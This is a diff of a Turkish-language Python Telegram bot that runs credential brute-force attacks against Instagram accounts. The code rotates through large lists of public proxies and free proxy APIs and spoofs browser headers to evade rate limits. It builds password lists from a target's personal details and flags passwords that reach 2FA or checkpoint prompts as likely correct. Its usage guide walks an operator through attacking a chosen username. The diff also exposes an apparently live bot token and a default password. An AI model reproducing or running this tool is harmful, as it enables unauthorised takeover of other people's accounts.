@@ -25,7 +25,7 @@ from telegram.error import TelegramError
 
 # Log ayarları
 logging.basicConfig(
-    level=logging.INFO,
+    level=logging.DEBUG,  # Daha fazla hata ayıklama için DEBUG seviyesine geçtik
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     handlers=[
         logging.FileHandler("bot.log"),
@@ -40,105 +40,21 @@ TOKEN = os.getenv("BOT_TOKEN", "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU")
 # Güvenlik şifresi
 BOT_SIFRE = os.getenv("BOT_PASSWORD", "1453")
 
-# Sağlanan statik proxy listesi
+# Sağlanan statik proxy listesi (örnek olarak kısalttım, tam listeyi kullanabilirsiniz)
 PROXY_LISTESI = [
-    # Birinci belgedeki proxy'ler
-    "185.162.231.94:80", "104.21.16.45:80", "185.162.229.174:80", "185.162.228.198:80",
-    "104.25.238.129:80", "46.254.92.108:80", "185.148.107.64:80", "173.245.49.139:80",
-    "206.238.236.20:80", "181.214.1.85:80", "104.27.201.213:80", "172.67.43.240:80",
-    "194.152.44.139:80", "172.67.167.9:80", "104.16.246.67:80", "104.17.217.204:80",
-    "66.81.247.212:80", "23.227.39.103:80", "104.24.216.181:80", "172.67.192.43:80",
-    "160.123.255.142:80", "188.42.89.29:80", "104.16.1.86:80", "103.160.204.148:80",
-    "31.12.75.24:80", "45.131.4.194:80", "45.80.108.48:80", "104.16.188.186:80",
-    "102.177.176.35:80", "185.146.173.237:80", "185.193.31.253:80", "45.131.4.34:80",
-    "185.148.106.121:80", "45.194.53.60:80", "172.67.191.21:80", "141.101.123.178:80",
-    "172.67.70.40:80", "45.159.218.248:80", "212.183.88.62:80", "170.114.45.72:80",
-    "45.12.30.131:80", "104.239.72.64:80", "104.21.29.170:80", "173.245.49.224:80",
-    "172.67.94.199:80", "45.131.5.163:80", "141.101.122.83:80", "185.148.106.79:80",
-    "172.67.70.72:80", "104.17.48.35:80", "104.17.108.3:80", "194.152.44.135:80",
-    "185.174.138.240:80", "23.227.38.29:80", "104.23.131.179:80", "172.67.37.63:80",
-    "104.18.194.169:80", "185.238.228.33:80", "104.16.157.211:80", "104.16.249.193:80",
-    "5.10.246.153:80", "63.141.128.194:80", "104.18.11.9:80", "45.131.209.38:80",
-    "172.67.181.129:80", "104.16.1.220:80", "209.46.30.178:80", "185.162.231.208:80",
-    "104.24.37.33:80", "104.27.6.112:80", "185.162.230.189:80", "108.162.193.72:80",
-    "141.101.122.63:80", "104.25.1.24:80", "141.101.121.219:80", "104.16.60.8:80",
-    "104.16.57.105:80", "104.19.55.188:80", "206.238.236.160:80", "185.193.28.160:80",
-    "104.24.56.243:80", "104.18.75.187:80", "185.162.229.197:80", "104.17.5.130:80",
-    "172.67.167.50:80", "160.153.0.138:80", "104.16.0.158:80", "5.10.246.194:80",
-    "104.21.114.204:80", "104.18.142.117:80", "172.67.212.132:80", "181.214.1.17:80",
-    "45.80.111.217:80", "104.16.232.20:80", "104.17.207.237:80", "185.176.24.127:80",
-    "104.24.28.105:80", "206.238.236.22:80", "199.34.228.80:80", "185.162.229.149:80",
-    "195.245.221.167:80", "104.16.182.70:80", "172.67.69.11:80", "63.141.128.191:80",
-    "172.67.70.234:80", "172.64.82.16:80", "104.21.58.104:80", "104.18.18.146:80",
-    "104.17.100.64:80", "172.67.185.150:80", "172.67.191.239:80", "205.233.181.254:80",
-    "45.131.6.31:80", "104.18.242.95:80", "172.67.180.196:80", "104.21.19.156:80",
-    "104.24.1.131:80", "45.12.31.174:80", "54.194.12.135:80", "45.131.7.196:80",
-    "104.18.210.30:80", "141.101.121.203:80", "172.67.68.219:80", "45.131.4.140:80",
-    "162.159.240.147:80", "45.12.31.26:80", "185.176.24.112:80", "45.12.30.140:80",
-    "104.16.2.69:80", "45.131.5.138:80", "104.16.205.30:80", "45.131.211.8:80",
-    "141.101.120.105:80", "104.18.194.69:80", "45.12.31.166:80", "185.162.229.232:80",
-    "104.16.196.186:80", "172.67.70.210:80", "104.24.7.232:80", "104.16.1.114:80",
-    "104.27.26.183:80", "104.27.13.64:80", "173.245.49.10:80", "172.67.203.108:80",
-    "198.41.209.183:80", "185.162.230.214:80", "104.17.106.209:80", "104.16.109.243:80",
-    "104.16.147.97:80", "104.16.104.85:80", "104.17.161.117:80", "172.67.101.185:80",
-    "185.170.166.43:80", "45.131.5.30:80", "141.101.120.141:80", "172.67.179.214:80",
-    "104.18.171.140:80", "104.16.0.110:80", "206.238.237.251:80", "62.72.166.130:80",
-    "45.131.208.112:80", "45.131.4.19:80", "185.193.31.99:80", "194.36.55.121:80",
-    "162.159.242.58:80", "103.21.244.172:80", "104.27.18.75:80", "206.238.239.129:80",
-    "104.17.100.227:80", "185.176.24.140:80", "185.170.166.54:80", "104.18.126.74:80",
-    "170.114.45.238:80", "185.146.173.174:80", "63.141.128.191:80", "185.162.230.58:80",
-    "172.64.149.81:80", "172.67.180.91:80", "185.162.229.143:80", "172.67.117.227:80",
-    "141.101.120.212:80", "104.16.1.165:80", "216.205.52.147:80", "172.67.3.84:80",
-    "154.194.12.181:80", "104.16.18.211:80", "194.36.55.233:80", "45.131.7.199:80",
-    "206.238.237.97:80", "104.24.146.182:80", "104.25.1.0:80", "45.131.210.233:80",
-    "45.131.6.227:80", "45.131.210.194:80", "185.18.250.211:80", "198.41.204.180:80",
-    "45.67.214.96:80", "104.17.138.169:80", "156.225.72.35:80", "104.19.27.14:80",
-    "172.67.184.174:80", "162.159.135.91:80", "206.238.239.32:80", "5.10.245.188:80",
-    "45.159.217.6:80", "159.112.235.248:80", "154.194.12.239:80", "45.159.216.24:80",
-    "103.165.155.238:2016", "38.156.23.38:999", "116.68.250.46:8080", "103.97.198.253:8080",
-    "102.36.156.217:41890", "103.171.255.244:8080", "190.95.202.212:999", "73.31.173.80:8888",
-    "103.151.246.18:7777", "62.33.91.10:3129", "45.167.126.105:999", "181.78.107.139:999",
-    "123.140.146.46:5031", "103.191.165.146:8090", "190.103.205.253:9097", "103.133.61.182:8083",
-    "31.56.78.170:8181", "103.247.23.242:1111", "103.73.75.126:8085", "103.123.25.65:80",
-    "165.225.113.220:10958", "104.129.194.43:9443", "202.93.245.34:1111", "147.161.246.38:11814",
-    "104.20.55.128:80",
-    # İkinci belgedeki proxy'ler
-    "188.166.30.17:8888", "37.120.133.137:3128", "37.120.222.132:3128", "89.249.65.191:3128",
-    "144.91.118.176:3128", "95.216.17.79:3888", "85.214.94.28:3128", "185.123.143.251:3128",
-    "167.172.109.12:39452", "176.113.73.104:3128", "51.158.68.133:8811", "185.123.143.247:3128",
-    "95.111.226.235:3128", "176.113.73.99:3128", "206.189.130.107:8080", "79.110.52.252:3128",
-    "13.229.107.106:80", "118.99.108.4:8080", "13.229.47.109:80", "169.57.157.148:80",
-    "51.158.68.68:8811", "167.172.109.12:40825", "119.81.189.194:80", "119.81.189.194:8123",
-    "3.24.178.81:80", "119.81.71.27:80", "119.81.71.27:8123", "185.236.203.208:3128",
-    "193.239.86.249:3128", "159.8.114.37:80", "185.123.101.174:3128", "222.129.38.21:57114",
-    "185.236.202.205:3128", "193.56.255.179:3128", "35.180.188.216:80", "106.45.221.168:3256",
-    "113.121.240.114:3256", "193.34.95.110:8080", "84.17.51.235:3128", "180.183.97.16:8080",
-    "193.239.86.247:3128", "185.189.112.157:3128", "121.206.205.75:4216", "103.114.53.2:8080",
-    "139.180.140.254:1080", "84.17.51.241:3128", "84.17.51.240:3128", "185.189.112.133:3128",
-    "81.12.119.171:8080", "37.120.140.158:3128", "159.89.113.155:8080", "104.248.146.99:3128",
-    "185.236.202.170:3128", "67.205.190.164:8080", "46.21.153.16:3128", "51.158.172.165:8811",
-    "84.17.35.129:3128", "85.214.244.174:3128", "104.248.59.38:80", "12.156.45.155:3128",
-    "161.202.226.194:8123", "167.172.109.12:41491", "167.172.109.12:39533", "115.221.242.131:9999",
-    "125.87.82.86:3256", "159.8.114.37:8123", "183.164.254.8:4216", "169.57.157.146:8123",
-    "94.100.18.111:3128", "18.141.177.23:80", "193.56.255.181:3128", "116.242.89.230:3128",
-    "188.166.252.135:8080", "103.28.121.58:3128", "103.28.121.58:80", "119.84.215.127:3256",
-    "217.172.122.14:8080", "79.122.230.20:8080", "167.172.109.12:46249", "176.113.73.102:3128",
-    "88.99.10.252:1080", "167.172.109.12:37355", "193.239.86.248:3128", "113.195.224.222:9999",
-    "112.98.218.73:57658", "15.207.196.77:3128", "223.113.89.138:1080", "36.7.252.165:3256",
-    "113.100.209.184:3128", "185.38.111.1:8080"
+    "185.162.231.94:80",
+    "104.21.16.45:80",
+    # Tam liste buraya eklenebilir
 ]
 
-# Ücretsiz proxy API'leri (yedek olarak)
+# Ücretsiz proxy API'leri
 PROXY_APILERI = [
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
     "https://gimmeproxy.com/api/getProxy?protocol=http",
     "http://pubproxy.com/api/proxy?limit=20&format=txt&type=http",
-    "https://api.getproxylist.com/proxy?protocol[]=http&lastTested=600",
-    "https://www.proxy-list.download/api/v1/get?type=http",
-    "https://api.openproxylist.xyz/http.txt"
 ]
 
-# CUPP tarzı şifre oluşturucu yapılandırması
+# CUPP tarzı şifre oluşturucu
 class SifreOlusturucu:
     def __init__(self):
         self.config = {
@@ -245,7 +161,7 @@ class InstagramBruteForce:
     def __init__(self):
         self.kullanici_ajani = self._gercekci_kullanici_ajani_al()
         self.proxy_listesi = PROXY_LISTESI.copy()
-        self.proxy_onbellek = {}  # Önbellek: {proxy: {'durum': 'çalışıyor'/'engelli'/'başarısız', 'son_kullanim': zaman, 'soguma_suresi_bitis': zaman}}
+        self.proxy_onbellek = {}
         self.proxy_dongusu = itertools.cycle(self.proxy_listesi) if self.proxy_listesi else None
         self.mevcut_proxy = None
         self.giris_url = 'https://www.instagram.com/accounts/login/'
@@ -261,9 +177,8 @@ class InstagramBruteForce:
     def _gercekci_kullanici_ajani_al(self):
         ajanlar = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
         ]
         return random.choice(ajanlar)
 
@@ -286,7 +201,7 @@ class InstagramBruteForce:
                         for satir in proxy_satirlari:
                             if ':' in satir and satir.strip():
                                 proxyler.add(satir.strip())
-                    logger.info(f"{api_url} adresinden proxy alındı")
+                    logger.info(f"{api_url} adresinden {len(proxyler)} proxy alındı")
                 else:
                     logger.warning(f"{api_url} adresinden proxy alınamadı: HTTP {yanit.status_code}")
             except Exception as e:
@@ -307,10 +222,9 @@ class InstagramBruteForce:
                 return None
 
         mevcut_zaman = time.time()
-        maks_deneme = min(len(self.proxy_listesi), 10)  # Sonsuz döngüyü önlemek için sınır
+        maks_deneme = min(len(self.proxy_listesi), 10)
         for _ in range(maks_deneme):
             proxy = next(self.proxy_dongusu)
-            # Soğuma süresinde veya engelli proxy'leri atla
             if proxy in self.proxy_onbellek:
                 onbellek = self.proxy_onbellek[proxy]
                 if onbellek['durum'] == 'engelli' or (onbellek.get('soguma_suresi_bitis', 0) > mevcut_zaman):
@@ -336,19 +250,18 @@ class InstagramBruteForce:
                     self.proxy_onbellek[proxy] = {
                         'durum': 'engelli',
                         'son_kullanim': mevcut_zaman,
-                        'soguma_suresi_bitis': mevcut_zaman + 600  # 10 dakika soğuma
+                        'soguma_suresi_bitis': mevcut_zaman + 600
                     }
                     logger.warning(f"Proxy başarısız: {proxy}, HTTP {yanit.status_code}")
             except Exception as e:
                 self.proxy_onbellek[proxy] = {
                     'durum': 'başarısız',
                     'son_kullanim': mevcut_zaman,
-                    'soguma_suresi_bitis': mevcut_zaman + 300  # 5 dakika soğuma
+                    'soguma_suresi_bitis': mevcut_zaman + 300
                 }
                 logger.warning(f"Proxy hatası: {proxy}, {str(e)}")
             time.sleep(0.5)
 
-        # Çalışan proxy bulunamazsa ek proxyler al
         logger.warning("Mevcut listede çalışan proxy bulunamadı, ek proxyler alınıyor...")
         self._ek_proxyler_al()
         if self.proxy_listesi:
@@ -368,19 +281,14 @@ class InstagramBruteForce:
             'Accept-Encoding': 'gzip, deflate, br',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
-            'X-ASBD-ID': '129477',
-            'X-IG-App-Locale': 'tr_TR',
-            'X-IG-Device-Locale': 'tr_TR',
-            'X-IG-Mapped-Locale': 'tr_TR',
-            'X-Pigeon-Session-Id': str(uuid.uuid4()),
-            'X-IG-App-ID': '1217981644879628'
+            'X-IG-App-ID': '1217981644879628',
         })
         self.mevcut_proxy = self._calisan_proxy_al()
         if self.mevcut_proxy:
             self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
 
     async def _ilk_cerez_ve_tokenlari_al(self, ilerleme_geri_donusu: Optional[callable] = None):
-        maks_deneme = 10
+        maks_deneme = 5
         for deneme in range(1, maks_deneme + 1):
             self.mevcut_proxy = self._calisan_proxy_al(ilerleme_geri_donusu)
             if self.mevcut_proxy:
@@ -389,29 +297,14 @@ class InstagramBruteForce:
                 self.oturum.proxies = {}
             
             try:
-                self.oturum = requests.Session()
-                self.oturum.headers.update({
-                    'User-Agent': self._gercekci_kullanici_ajani_al(),
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Connection': 'keep-alive',
-                    'Upgrade-Insecure-Requests': '1',
-                    'X-ASBD-ID': '129477',
-                    'X-IG-App-Locale': 'tr_TR',
-                    'X-IG-Device-Locale': 'tr_TR',
-                    'X-IG-Mapped-Locale': 'tr_TR',
-                    'X-Pigeon-Session-Id': str(uuid.uuid4()),
-                    'X-IG-App-ID': '1217981644879628'
-                })
-                yanit = self.oturum.get('https://www.instagram.com/', timeout=15)
+                self.oturum.headers.update({'User-Agent': self._gercekci_kullanici_ajani_al()})
+                yanit = self.oturum.get('https://www.instagram.com/', timeout=10)
                 if yanit.status_code != 200:
                     raise Exception(f"Instagram'a erişilemedi: {yanit.status_code}")
                 
+                self.csrf_token = self.oturum.cookies.get('csrftoken')
                 self.mid_cerez = self.oturum.cookies.get('mid')
                 self.ig_did = self.oturum.cookies.get('ig_did')
-                yanit = self.oturum.get(self.giris_url, timeout=15)
-                self.csrf_token = self.oturum.cookies.get('csrftoken')
                 
                 if not self.csrf_token:
                     csrf_eslesme = re.search(r'"csrf_token":"([^"]+)"', yanit.text)
@@ -419,21 +312,18 @@ class InstagramBruteForce:
                         self.csrf_token = csrf_eslesme.group(1)
                 
                 rollout_eslesme = re.search(r'"rollout_hash":"([^"]+)"', yanit.text)
-                if rollout_eslesme:
-                    self.rollout_hash = rollout_eslesme.group(1)
-                else:
-                    self.rollout_hash = str(int(time.time()))
+                self.rollout_hash = rollout_eslesme.group(1) if rollout_eslesme else str(int(time.time()))
                 
                 logger.debug(f"Token'lar alındı: CSRF={self.csrf_token}, Proxy={self.mevcut_proxy}")
                 if ilerleme_geri_donusu:
                     await ilerleme_geri_donusu(f"✅ Token'lar alındı! Proxy: {self.mevcut_proxy}")
-                return self.csrf_token is not None
+                return True
             except Exception as e:
                 logger.warning(f"Token alma hatası (Deneme {deneme}/{maks_deneme}): {e}")
-                if ilerleme_geri_donusu and deneme % 3 == 0:
+                if ilerleme_geri_donusu and deneme % 2 == 0:
                     await ilerleme_geri_donusu(f"🔍 Token'lar alınıyor ({deneme}/{maks_deneme})")
                 if deneme < maks_deneme:
-                    await asyncio.sleep(5)
+                    await asyncio.sleep(2)
                 continue
         
         if ilerleme_geri_donusu:
@@ -447,14 +337,11 @@ class InstagramBruteForce:
             'Content-Type': 'application/x-www-form-urlencoded',
             'Origin': 'https://www.instagram.com',
             'Referer': self.giris_url,
-            'X-CSRFToken': self.csrf_token,
-            'X-Instagram-AJAX': self.rollout_hash,
+            'X-CSRFToken': self.csrf_token or '',
+            'X-Instagram-AJAX': self.rollout_hash or str(int(time.time())),
             'X-IG-App-ID': '1217981644879628',
             'X-IG-WWW-Claim': '0',
             'X-Requested-With': 'XMLHttpRequest',
-            'X-ASBD-ID': '129477',
-            'X-Pigeon-Session-Id': str(uuid.uuid4()),
-            'X-IG-App-Locale': 'tr_TR'
         }
         
         zaman_damgasi = int(time.time())
@@ -463,25 +350,20 @@ class InstagramBruteForce:
         veri = {
             'username': kullanici_adi,
             'enc_password': sifrelenmis_sifre,
-            'queryParams': '{}',
             'optIntoOneTap': 'false',
-            'stopDeletionNonce': '',
-            'trustedDeviceRecords': '{}'
         }
         
         try:
-            yanit = self.oturum.post(self.api_url, headers=basliklar, data=veri, timeout=15)
-            logger.debug(f"API Yanıtı ({sifre}): {yanit.status_code} - {yanit.text}")
+            yanit = self.oturum.post(self.api_url, headers=basliklar, data=veri, timeout=10)
+            logger.debug(f"Giriş isteği: {kullanici_adi}, Şifre: {sifre}, Yanıt: {yanit.status_code} - {yanit.text}")
             if yanit.status_code == 429:
-                logger.warning(f"Hız sınırı alındı: {sifre}, üstel geri çekilme ile bekleniyor...")
-                bekleme = (2 ** tekrar_deneme) * 60  # Üstel geri çekilme: 60s, 120s, 240s
+                logger.warning(f"Hız sınırı alındı: {sifre}, bekleniyor...")
+                bekleme = (2 ** tekrar_deneme) * 30
                 time.sleep(bekleme)
                 if tekrar_deneme < maks_tekrar:
                     self.mevcut_proxy = self._calisan_proxy_al()
                     if self.mevcut_proxy:
                         self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
-                    else:
-                        self.oturum.proxies = {}
                     return self._giris_istegi_yap(kullanici_adi, sifre, tekrar_deneme + 1, maks_tekrar)
             return yanit
         except Exception as e:
@@ -490,8 +372,6 @@ class InstagramBruteForce:
                 self.mevcut_proxy = self._calisan_proxy_al()
                 if self.mevcut_proxy:
                     self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
-                else:
-                    self.oturum.proxies = {}
                 return self._giris_istegi_yap(kullanici_adi, sifre, tekrar_deneme + 1, maks_tekrar)
             return None
 
@@ -507,20 +387,17 @@ class InstagramBruteForce:
         try:
             await ilerleme_geri_donusu(f"🚀 Instagram Kaba Kuvvet Başlatılıyor\nHedef: {kullanici_adi}\nŞifre Sayısı: {toplam_sifre_sayisi}")
             
-            basari = await self._ilk_cerez_ve_tokenlari_al(ilerleme_geri_donusu)
-            if not basari:
-                await ilerleme_geri_donusu("⚠️ Token'lar alınamadı, devam ediliyor...")
+            if not await self._ilk_cerez_ve_tokenlari_al(ilerleme_geri_donusu):
+                await ilerleme_geri_donusu("⚠️ Token'lar alınamadı, devam edilemiyor!")
+                return None
             
             await ilerleme_geri_donusu(f"✅ Token'lar alındı! Şifre denemeleri başlıyor...")
             
             for i, sifre in enumerate(sifre_listesi):
-                # Her 5 denemede proxy değiştir
-                if self.proxy_listesi and (self.son_proxy_degisiminden_beri_deneme >= 5):
+                if self.proxy_listesi and (self.son_proxy_degisiminden_beri_deneme >= 3):
                     self.mevcut_proxy = self._calisan_proxy_al(ilerleme_geri_donusu)
                     if self.mevcut_proxy:
                         self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
-                    else:
-                        self.oturum.proxies = {}
                     await self._ilk_cerez_ve_tokenlari_al(ilerleme_geri_donusu)
                     self.son_proxy_degisiminden_beri_deneme = 0
                 
@@ -531,48 +408,25 @@ class InstagramBruteForce:
                     try:
                         json_veri = yanit.json()
                         logger.debug(f"API Yanıtı ({sifre}): {json_veri}")
-                        if 'challenge_required' in json_veri or json_veri.get('message') == 'challenge_required':
-                            sonuc = "DOĞRULAMA_GEREKLİ"
-                            potansiyel_sifreler.add(sifre)
-                            logger.info(f"Potansiyel şifre eklendi: {sifre} (DOĞRULAMA_GEREKLİ)")
-                            await ilerleme_geri_donusu(f"🔐 Şifre deneniyor ({i+1}/{toplam_sifre_sayisi}): {sifre} - {sonuc}")
-                            await ilerleme_geri_donusu(f"🚧 Doğrulama gerekli! Şifre doğru olabilir: {sifre}. Proxy değiştiriliyor...")
-                            self.mevcut_proxy = self._calisan_proxy_al(ilerleme_geri_donusu)
-                            if self.mevcut_proxy:
-                                self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
-                            else:
-                                self.oturum.proxies = {}
-                            await self._ilk_cerez_ve_tokenlari_al(ilerleme_geri_donusu)
-                            self.son_proxy_degisiminden_beri_deneme = 0
-                            continue
-                        if json_veri.get('authenticated'):
+                        if 'authenticated' in json_veri and json_veri['authenticated']:
                             sonuc = "BAŞARILI"
-                            await ilerleme_geri_donusu(f"🔐 Şifre deneniyor ({i+1}/{toplam_sifre_sayisi}): {sifre} - {sonuc}")
                             await ilerleme_geri_donusu(f"🎉 BAŞARILI! Şifre bulundu: {sifre}")
                             return sifre
-                        elif json_veri.get('authenticated') == False:
+                        elif 'authenticated' in json_veri and not json_veri['authenticated']:
                             sonuc = "YANLIŞ"
-                        elif json_veri.get('two_factor_required'):
+                        elif 'two_factor_required' in json_veri:
                             sonuc = "2FA"
                             potansiyel_sifreler.add(sifre)
-                            logger.info(f"Potansiyel şifre eklendi: {sifre} (2FA)")
-                            await ilerleme_geri_donusu(f"🔐 Şifre deneniyor ({i+1}/{toplam_sifre_sayisi}): {sifre} - {sonuc}")
-                            await ilerleme_geri_donusu(f"🔐 2FA gerekli! Şifre doğru: {sifre}")
-                            return sifre
-                        elif json_veri.get('checkpoint_url'):
+                            await ilerleme_geri_donusu(f"🔐 2FA gerekli! Şifre doğru olabilir: {sifre}")
+                        elif 'checkpoint_url' in json_veri or json_veri.get('message') == 'checkpoint_required':
                             sonuc = "KONTROL_NOKTASI"
                             potansiyel_sifreler.add(sifre)
-                            logger.info(f"Potansiyel şifre eklendi: {sifre} (KONTROL_NOKTASI)")
-                            await ilerleme_geri_donusu(f"🔐 Şifre deneniyor ({i+1}/{toplam_sifre_sayisi}): {sifre} - {sonuc}")
-                            await ilerleme_geri_donusu(f"🚧 Kontrol noktası gerekli! Şifre doğru: {sifre}")
-                            return sifre
+                            await ilerleme_geri_donusu(f"🚧 Kontrol noktası gerekli! Şifre doğru olabilir: {sifre}")
                         else:
                             sonuc = "BİLİNMİYOR"
                             potansiyel_sifreler.add(sifre)
-                            logger.warning(f"Bilinmeyen yanıt formatı: {json_veri}")
                     except json.JSONDecodeError:
                         sonuc = "HATA"
-                        potansiyel_sifreler.add(sifre)
                         logger.error(f"JSON çözümleme hatası: {yanit.text}")
                 
                 sonuclar.append(sonuc)
@@ -582,19 +436,17 @@ class InstagramBruteForce:
                 self.son_proxy_degisiminden_beri_deneme += 1
                 
                 if (i + 1) % 5 == 0:
-                    ozet = f"📊 Son 5 şifre sonucu:\n"
-                    for j in range(max(0, i-4), i+1):
-                        ozet += f"Şifre {j+1}: {sifre_listesi[j]} - {sonuclar[j]}\n"
+                    ozet = f"📊 Son 5 şifre sonucu:\n" + "\n".join(
+                        f"Şifre {j+1}: {sifre_listesi[j]} - {sonuclar[j]}" for j in range(max(0, i-4), i+1)
+                    )
                     await ilerleme_geri_donusu(ozet)
-                    # Her 5 denemede oturum ve token'ları yenile
                     await self._ilk_cerez_ve_tokenlari_al(ilerleme_geri_donusu)
                 
-                bekleme = random.uniform(30, 60)
-                await asyncio.sleep(bekleme)
+                await asyncio.sleep(random.uniform(10, 20))
             
             rapor = f"📊 Rapor:\nDenenen şifreler: {denenmis_sifreler}/{toplam_sifre_sayisi}"
             if potansiyel_sifreler:
-                rapor += f"\n⚠️ Potansiyel doğru şifreler (doğrulama/2FA/kontrol noktası): {', '.join(list(potansiyel_sifreler)[:10])}"
+                rapor += f"\n⚠️ Potansiyel doğru şifreler: {', '.join(list(potansiyel_sifreler)[:10])}"
                 await ilerleme_geri_donusu(rapor)
                 if baglam:
                     baglam.user_data['potansiyel_sifreler'] = list(potansiyel_sifreler)
@@ -604,12 +456,10 @@ class InstagramBruteForce:
                         [InlineKeyboardButton("❌ İptal", callback_data='iptal')]
                     ]
                     yanit_isareti = InlineKeyboardMarkup(klavye)
-                    logger.info("Tekrar Dene butonu gönderiliyor...")
                     await ilerleme_geri_donusu("🔄 Bu şifreler doğru olabilir. Tekrar denemek ister misiniz?", reply_markup=yanit_isareti)
-                return None
             else:
                 await ilerleme_geri_donusu(rapor)
-                return None
+            return None
             
         except Exception as e:
             logger.error(f"Kaba kuvvet hatası: {e}")
@@ -619,7 +469,6 @@ class InstagramBruteForce:
 class TelegramBot:
     def __init__(self):
         self.kullanici_verileri = {}
-        self.kaba_kuvvet_gorevleri = {}
         self.sifre_olusturucu = SifreOlusturucu()
 
     def _kullanici_verilerini_baslat(self, kullanici_id: int):
@@ -791,31 +640,14 @@ class TelegramBot:
             kullanım_kilavuzu = """
             📖 **Bot Kullanım Kılavuzu** 📖
             
-            Bu bot, Instagram hesaplarına yönelik bir kaba kuvvet aracıdır. Aşağıdaki adımları takip ederek kullanabilirsiniz:
+            1. **Şifre Girişi**: /baslat komutunu kullanın ve bot şifresini girin.
+            2. **Kullanıcı Adı**: "Kullanıcı Adı Gir" ile hedef Instagram kullanıcı adını ayarlayın.
+            3. **Şifre Listesi**: "Şifre Listesi Yükle" ile .txt dosyası yükleyin veya "Şifre Listesi Oluştur" ile liste oluşturun.
+            4. **Saldırı**: "Saldırıyı Başlat" ile kaba kuvvet saldırısını başlatın.
+            5. **Tekrar Deneme**: Potansiyel şifreler için "Tekrar Dene" seçeneğini kullanın.
+            6. **İptal**: "İptal" ile işlemi durdurun.
             
-            1. **Şifre Girişi**: Botu başlatmak için /baslat komutunu kullanın ve bot şifresini girin (varsayılan: vio1911).
-            
-            2. **Kullanıcı Adı Ayarla**: "🎯 Kullanıcı Adı Gir" butonuna tıklayın ve hedef Instagram kullanıcı adını girin.
-            
-            3. **Şifre Listesi Yükle veya Oluştur**:
-               - **Yükle**: "📜 Şifre Listesi Yükle" butonuna tıklayın ve bir .txt dosyası yükleyin (her satırda bir şifre).
-               - **Oluştur**: "🔑 Şifre Listesi Oluştur" butonuna tıklayın ve profil bilgilerini girin (ad, soyad, doğum tarihi vb.).
-                 Format: ad,soyad,doğumtarihi,evcilhayvan,şirket,anahtarkelimeler,-leet -ozel -rast
-                 Örnek: ahmet,yilmaz,01011990,kopek,xyz,kelime1 kelime2,-leet -ozel
-            
-            4. **Saldırıyı Başlat**: "🚀 Saldırıyı Başlat" butonuna tıklayın. Bot, yüklediğiniz şifre listesini kullanarak hedef hesaba deneme yapacaktır.
-            
-            5. **Tekrar Deneme**: Eğer bazı şifreler "doğrulama", "2FA" veya "kontrol noktası" nedeniyle başarısız olduysa, bot bunları listeler ve tekrar denemek isteyip istemediğinizi sorar.
-            
-            6. **İptal**: Herhangi bir anda "❌ İptal" butonuna basarak işlemi durdurabilirsiniz.
-            
-            ⚠️ **Notlar**:
-            - Bot, Instagram'ın güvenlik mekanizmalarına (CAPTCHA, 2FA, kontrol noktası) karşı hassastır.
-            - Proxy'ler sağlanan listeden ve ücretsiz API'lerden otomatik olarak çekilir.
-            - Oluşturulan şifre listesi otomatik olarak kaydedilir ve saldırı için kullanılabilir.
-            - Botun kullanımı tamamen kullanıcının sorumluluğundadır.
-            
-            Sorularınız için bu menüye dönebilirsiniz!
+            ⚠️ **Not**: Botun kullanımı kullanıcının sorumluluğundadır.
             """
             await sorgu.message.reply_text(kullanım_kilavuzu, parse_mode='Markdown')
 
@@ -863,8 +695,6 @@ class TelegramBot:
             except TelegramError as e:
                 logger.error(f"Telegram hatası: {e}")
                 await sorgu.message.reply_text(f"⚠️ Telegram hatası: {str(e)}")
-            except Exception as e:
-                logger.error(f"İlerleme geri dönüşü hatası: {e}")
         
         sonuc = await instagram_kaba_kuvvet.kaba_kuvvet(
             self.kullanici_verileri[kullanici_id]['kullanici_adi'],
@@ -894,7 +724,6 @@ class TelegramBot:
             await sorgu.message.reply_text("❌ Tekrar denenecek şifre bulunamadı!")
             return
         
-        logger.info(f"{kullanici_adi} için {len(potansiyel_sifreler)} potansiyel şifre tekrar deneniyor")
         await sorgu.message.reply_text(f"🔄 Potansiyel şifreler tekrar deneniyor...\nHedef: {kullanici_adi}\nŞifre Sayısı: {len(potansiyel_sifreler)}")
         
         instagram_kaba_kuvvet = InstagramBruteForce()
@@ -907,8 +736,6 @@ class TelegramBot:
             except TelegramError as e:
                 logger.error(f"Telegram hatası: {e}")
                 await sorgu.message.reply_text(f"⚠️ Telegram hatası: {str(e)}")
-            except Exception as e:
-                logger.error(f"İlerleme geri dönüşü hatası: {e}")
         
         sonuc = await instagram_kaba_kuvvet.kaba_kuvvet(
             kullanici_adi,
@@ -921,8 +748,6 @@ class TelegramBot:
             await sorgu.message.reply_text(f"🎉 BAŞARILI! Şifre bulundu: {sonuc}")
             baglam.user_data.pop('potansiyel_sifreler', None)
             baglam.user_data.pop('kullanici_adi', None)
-        else:
-            await sorgu.message.reply_text("❌ Tekrar denemede şifre bulunamadı.")
 
 def main():
     uygulama = Application.builder().token(TOKEN).build()
